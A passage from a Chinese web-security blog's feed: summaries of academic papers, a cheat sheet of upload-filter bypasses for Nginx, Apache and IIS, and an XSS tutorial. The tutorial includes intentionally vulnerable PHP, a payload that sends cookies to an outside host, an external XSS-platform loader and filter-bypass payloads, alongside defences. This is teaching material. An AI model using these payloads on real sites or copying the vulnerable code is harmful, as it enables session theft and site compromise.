usenix17</h2><p>本文检查了97-16年的重要网站代码和头信息，以此确定web技术的关键趋势，随后评估与之关联的漏洞，在调查解决他们的安全防御机制。本文发现自2000年以来，JavaScript开始流行，客户端注入的可能性增加，但CSP的部署却没有跟上，另外使用HTTP only cookie的网站更容易遭受XSS。</p><h1 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h1><h2 id="k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16"><a href="#k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16" class="headerlink" title="k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16"></a>k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16</h2><p>攻击者可以在tor网络中实施被动攻击比如，指纹识别，本文提出了基于随机森林的网站指纹识别技术，它能抵抗tor和先进的网站指纹识别防御技术。</p><h2 id="Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16"><a href="#Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16" class="headerlink" title="Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16"></a>Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16</h2><p>恶意网站会使用复杂技术隐藏自身，防止被搜索引擎发现其本质。我们调查了暗网的十大著名技术，并且开发了一种反隐身系统。</p><h2 id="JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19"><a href="#JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19" class="headerlink" title="JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19"></a>JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19</h2><p>如今的浏览器会提供匿名功能隐藏信息，而本文提出了一种自动化推断系统信息（包括软件和硬件）的方法，该方法通过JavaScript引擎收集各种数据，再根据这些属性创建模板，如果这个模板的某一属性在各个系统上都不相同则它是一个依赖于环境的属性。</p><h1 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h1><h2 id="On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16"><a href="#On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16" class="headerlink" title="On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16"></a>On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16</h2><p>元数据攻击指针对版本控制系统的攻击方法，它欺骗开发者执行意外操作，比如将未经测试的代码合并到生产分支中，或是包含一致漏洞的组件。本文提出了一种防御方案，通过维护开发人员的加密签名后的日志环节这些攻击。</p><h2 id="Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14"><a href="#Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14" class="headerlink" title="Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14"></a>Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14</h2><p>本文使用数据挖掘和机器学习的几种技术，来预测一个给定的、未被侵入的网站是否会变得有问题。</p><h2 id="Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17"><a href="#Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17" class="headerlink" title="Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17"></a>Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17</h2><p>本文开发了一个SCANNER的工具，用于检测PHP应用程序中与资源相关的侧信道泄露漏洞——例如一个关于健康的网站，泄露了病人吃药的时间。</p><h2 id="Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18"><a href="#Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18" class="headerlink" title="Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18"></a>Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18</h2><p>本文提出了一种系统，可以再单个浏览会话级别上观察用户行为，从而预测他们是否是攻击型为，已达到提前预防的目的。</p><h2 id="Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17"><a href="#Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17" class="headerlink" title="Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17"></a>Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17</h2><p>本文提出检测CSRF的框架，该框架考虑了web应用的执行流程，数据流以及整体架构，构建一个属性图，然后使用图遍历，发觉潜在的CSRF问题。Deemon自动判断web应用的执行环境，接着无监督的产生动态记录，比如网络交互，服务端执行和数据库操作，使用这些记录Deemon构建一个图模型，他表示捕获的状态转换和数据流；接着遍历这个图来发觉http状态变换，这些变换与CSRF流动现骨干。</p><h2 id="Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16"><a href="#Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16" class="headerlink" title="Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*"></a>Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*</h2><p>我们针对单点登陆(SSO)存在的问题，设计了两种攻击模式CSRF和XSS，并且基于ZAP设计了扫描器，经过实验我们发先它能发现知名网站的安全性问题。</p><h2 id="Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14"><a href="#Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14" class="headerlink" title="Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14"></a>Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14</h2><p>由于缺失文档，判断逻辑漏洞十分困难，现有的工具需要调查源代码或是只适用于小规模应用，而我们利用用户产生的流量产生一个行为序列，接着重用这个序列判断网站是否存在问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;About&quot;&gt;&lt;a href=&quot;#About&quot; class=&quot;headerlink&quot; title=&quot;About&quot;&gt;&lt;/a&gt;About&lt;/h1&gt;&lt;p&gt;本文列出四大安全会议（USENIX、CCS、NDSS和S&amp;amp;P）近5年来与Web安全有关的研究，已发现web方向的研究点。&lt;/p&gt;&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;p&gt;研究热点聚焦在DOM-XSS上：&lt;/p&gt;&lt;h2 id=&quot;Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19&quot;&gt;&lt;a href=&quot;#Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19&quot; class=&quot;headerlink&quot; title=&quot;Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*&quot;&gt;&lt;/a&gt;Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*&lt;/h2&gt;
    
    </summary>
    
      <category term="Web安全-学术" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-%E5%AD%A6%E6%9C%AF/"/>
    
    
      <category term="Web安全" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学术" scheme="http://anemone.top/tags/%E5%AD%A6%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>容器上传绕过总结</title>
    <link href="http://anemone.top/%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>http://anemone.top/组件-容器上传绕过总结/</id>
    <published>2019-02-15T07:15:43.000Z</published>
    <updated>2019-09-22T10:14:18.795Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建漏洞服务"><a href="#搭建漏洞服务" class="headerlink" title="搭建漏洞服务"></a>搭建漏洞服务</h1><p>还是先搭一个漏洞的服务吧：新建一个~/Desktop/php/upload文件夹，文件夹下存在如下结构的文件和文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── files</span><br><span class="line">└── upload.php</span><br><span class="line"></span><br><span class="line">1 directory, 1 file</span><br></pre></td></tr></table></figure><p>upload.php:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    // 判断当期目录下的 upload 目录是否存在该文件</span><br><span class="line">    // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span><br><span class="line">    if (file_exists(&quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;PWD: &quot; . `pwd` . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">        // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">        $file_path = &quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $success = move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path);</span><br><span class="line">        echo &quot;Stored in: &quot; .$file_path.&quot;&lt;br/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        if(file_exists($file_path))&#123;</span><br><span class="line">            $str = file_get_contents($file_path);//将整个文件内容读入到一个字符串中</span><br><span class="line">            $str = str_replace(&quot;\r\n&quot;,&quot;&lt;br /&gt;&quot;,$str);</span><br><span class="line">            $str = htmlspecialchars($str);</span><br><span class="line">            echo &quot;File Contents: $str&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>1.php%001.jpg</code>，Nginx在<code>%00</code>截断，例如：</p><p>用%00截断过狗：</p><p><img src="/组件-容器上传绕过总结/1544361917866.png" alt="1544361917866"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>设置上传目录不被php解析：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> test.com;</span><br><span class="line">    <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> test.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \/upload\/files\/.*</span> &#123;</span><br><span class="line">        <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># With php7.0-cgi alone:</span></span><br><span class="line">        <span class="comment"># fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment"># With php7.0-fpm:</span></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名后缀黑名单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="2-4-0以前"><a href="#2-4-0以前" class="headerlink" title="2.4.0以前"></a>2.4.0以前</h2><p><code>1.php.xxx</code>Apache从后往前解析，直到能解析。</p><h2 id="2-4-0-2-4-29"><a href="#2-4-0-2-4-29" class="headerlink" title="2.4.0-2.4.29"></a>2.4.0-2.4.29</h2><p><code>1.php%0A</code>因为代码中不能用<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>获取文件名，所以利用条件苛刻。</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="6-0"><a href="#6-0" class="headerlink" title="6.0"></a>6.0</h2><ul><li><code>/xx.asp;.jpg</code> IIS不解析<code>;</code>后面的内容</li><li><code>/1.asp/1.jpg</code> IIS将<code>.asp</code>文件夹下的所有文件解析</li></ul><h2 id="7-5"><a href="#7-5" class="headerlink" title="7.5"></a>7.5</h2><p><code>php.jpg/.php</code> 要开启<code>cgi.fix_pathinfo=1</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;搭建漏洞服务&quot;&gt;&lt;a href=&quot;#搭建漏洞服务&quot; class=&quot;headerlink&quot; title=&quot;搭建漏洞服务&quot;&gt;&lt;/a&gt;搭建漏洞服务&lt;/h1&gt;&lt;p&gt;还是先搭一个漏洞的服务吧：新建一个~/Desktop/php/upload文件夹，文件夹下存在如下结构的文件和文件夹：&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ tree&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── files&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;└── upload.php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1 directory, 1 file&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;upload.php:&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全-组件" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-%E7%BB%84%E4%BB%B6/"/>
    
    
      <category term="nginx" scheme="http://anemone.top/tags/nginx/"/>
    
      <category term="apache" scheme="http://anemone.top/tags/apache/"/>
    
      <category term="IIS" scheme="http://anemone.top/tags/IIS/"/>
    
  </entry>
  
  <entry>
    <title>XSS类型、利用和防御</title>
    <link href="http://anemone.top/xss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
    <id>http://anemone.top/xss-XSS类型、利用和防御/</id>
    <published>2019-02-14T06:39:05.000Z</published>
    <updated>2019-09-29T08:52:16.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>用户访问带有XSS代码的请求，服务器立即将代码发送至浏览器，浏览器执行恶意代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1/reflect.php?xss=&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br><span class="line">setcookie(<span class="string">'session'</span>, <span class="string">'qwerty'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/xss-XSS类型、利用和防御/1550126906314.png" alt="1550126906314"></p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>XSS代码被保存（至数据库），待页面被访问时再执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">'get'</span>)&#123;</span><br><span class="line">    $sql=<span class="string">"select * from test where username='$name'"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">            print_r($row);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $sql=<span class="string">"insert into test values ('$name', '$password')"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        print_r($result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先插入一个存在问题的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=insert&amp;name=anemone&amp;password=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550129399199.png" alt="1550129399199"></p><p>接着访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=get&amp;name=anemone</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550129511724.png" alt="1550129511724"></p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>通过js操控dom引入xss代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// http://127.0.0.1/dom.php?url=javascript:alert(/xss/)</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url_search=<span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> the_url = <span class="keyword">new</span> URLSearchParams(url_search).get(<span class="string">'url'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> markup=<span class="string">'&lt;a href="'</span>+the_url+<span class="string">'"&gt;Link&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(markup);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550131058571.png" alt="1550131058571"></p><p>出现场景：</p><ul><li>在前端实现页面跳转（location.href=’javascript:alert(1)’）</li><li>取值写入页面或动态执行 <ul><li>div.innerHTML=payload</li><li>eval(payload)</li></ul></li><li>使用HTML5 postMessage进行跨域通讯 </li></ul><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>发送cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=&lt;script&gt;fetch(&apos;http://127.0.0.2:8888/&apos;.concat(window.btoa(document.cookie)))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>使用XSSPT平台：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=%3Cscript%20src=https://xsspt.com/v5Ia54%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ol><li><p>使用input/img/svg等标签和onerror/onload/onfocus等属性绕过关键词:</p><ul><li><code>&lt;input autofocus id=a name=&quot;javascript:123&quot; onfocus=&quot;alert(1)&quot;&gt;</code></li><li><code>&lt;img/src/onerror=alert(1)&gt;</code></li><li><code>&lt;svg/onload=alert(1)&gt;</code></li><li><code>&lt;video/src/onerror=alert(1)&gt;</code></li><li><code>&lt;video/src/onloadstart=alert(1)&gt;</code></li><li><code>&lt;details/open/ontoggle=alert(1)&gt;</code></li></ul></li><li><p>使用concat绕过黑名单单词：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'javascri'</span>.concat(<span class="string">'pt:aler'</span>,<span class="string">'t(1)'</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用<code>+</code>绕过空格</p></li><li><p>二次编码</p></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>开启Cookie的HttpOnly选项</p><h2 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h2><ul><li><p>（默认选项）添加浏览器保护头部<code>x-xss-protection: 1</code></p></li><li><p>渲染至页面时进行htmlencode</p><p><code>htmlspecialchars(&#39;&lt;script&gt;&#39;) =&gt; &amp;lt;script&amp;gt;</code></p></li></ul><h2 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h2><p>渲染至页面时进行htmlencode</p><h2 id="DOM型-1"><a href="#DOM型-1" class="headerlink" title="DOM型"></a>DOM型</h2><p>在js中进行<code>encodeURI</code>过滤，对于标签中的属性（如示例中的href）使用正则过滤。</p><h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>至少过滤如下符号：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">escapeHTML(t)&#123;</span><br><span class="line">    <span class="keyword">return</span> t.replace(<span class="regexp">/&amp;/g</span>,<span class="string">"&amp;amp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&lt;/g</span>,<span class="string">"&amp;lt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&gt;/g</span>,<span class="string">"&amp;gt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/ /g</span>,<span class="string">"&amp;nbsp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/"/g</span>,<span class="string">"&amp;#34;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/'/g</span>,<span class="string">"&amp;#39;"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>驱散前端安全梦魇——DOMXSS典型场景分析与修复指南，<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/107</a></li></ul>]]></content>
    
    <summary type="html">
    
